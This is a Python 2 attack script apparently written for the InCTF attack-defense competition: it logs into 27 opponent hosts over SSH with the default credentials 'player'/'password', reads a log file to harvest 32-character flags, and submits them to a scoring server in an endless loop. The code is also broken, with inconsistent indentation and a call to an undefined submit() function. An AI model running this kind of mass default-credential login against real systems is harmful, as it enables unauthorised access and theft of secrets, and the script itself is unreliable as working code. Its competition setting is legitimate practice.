#!/usr/bin/python
#Default user vulnerability InCTF 
#This script will capture the flags together at same time. 

import paramiko
import re
import telnetlib
import time
import gevent

class default_usr:

        def __init__(self):
                self.serv_list = range(1,28)
                self.flags = []
        def submit_flags(self):
                #print self.flags
        	      t=telnetlib.Telnet("10.1.100.1",31337)
                t.get_socket().recv(1024)
                t.write("4\n")
                t.get_socket().recv(1024)
                for flag in self.flags:
	        	            t.write(flag+"\n")
	        	            print flag
                        print t.get_socket().recv(1024).strip()
                t.close()
        
        def list_flag(self, no):
                serv_addr="10.1.1%02d.1" %no        			                        
                try:                        			
                        ssh=paramiko.SSHClient()
        			          ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        			          ssh.connect(serv_addr,username='player',password='password', timeout=1)
        			          stdin, stdout, stderr = ssh.exec_command('cat secret-service/logs')
        			          flag=re.findall("\S{32}",stdout.read())[-1]	
        			          self.flags.append(flag)
        			          ssh.close()
             		except:
        			          print "Exception[%02d]" %no
   
        def greenlet_init(self):
                threads = [gevent.spawn(self.list_flag,no ) for no in self.serv_list]
                gevent.joinall(threads)
                if len(self.flags) == 0:
        		            print "Flag list emply."
                else:
                        submit()
                        self.flags = []
                
                        		
if __name__=="__main__":

        d = default_usr()
        while True:
                d.greenlet_init()
        
